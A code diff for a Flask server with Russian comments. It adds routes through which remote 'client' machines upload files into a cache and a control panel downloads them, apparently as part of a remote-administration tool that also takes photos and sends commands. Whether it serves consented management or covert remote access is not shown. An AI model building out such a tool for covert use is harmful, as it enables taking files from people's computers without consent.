@@ -159,7 +159,40 @@ def sent_photo1(client, pc):
         "size": len(data),
     })
 
-# ---------- Диспетчер задач: команды ----------
+
+@app.route("/sent/file/<client>/<pc>/<path:filepath>", methods=["POST"])
+def sent_file(client, pc, filepath):
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    data = request.get_data()
+    if not data:
+        return jsonify({"Succes": False})
+
+    with file_cache_lock:
+        file_cache[(client, pc, filepath)] = data
+    return jsonify({"Succes": True, "size": len(data)})
+
+# кэш скачанных файлов: (client, pc, path) -> bytes
+file_cache = {}
+file_cache_lock = threading.Lock()
+
+@app.route("/file/<client>/<pc>/<path:filename>", methods=["GET"])
+def get_file(client, pc, filename):
+    """Отдаёт файл с клиента (панель запрашивает у сервера, сервер — у клиента
+    через команду download_file, результат кладёт во временное хранилище)."""
+    if "/" in client or "\\" in client or "/" in pc or "\\" in pc:
+        return jsonify({"Succes": False})
+
+    key = (client, pc, filename)
+    with file_cache_lock:
+        data = file_cache.get(key)
+        if data is None:
+            return jsonify({"Succes": False, "Error": "not found"}), 404
+        # не удаляем — пусть полежит, панель может запросить повторно
+    import io as _io
+    return send_file(_io.BytesIO(data), mimetype="application/octet-stream",
+                     download_name=os.path.basename(filename))
 
 @app.route("/sent/command/<client>/<pc>/", methods=["POST"])
 def sent_command(client, pc):
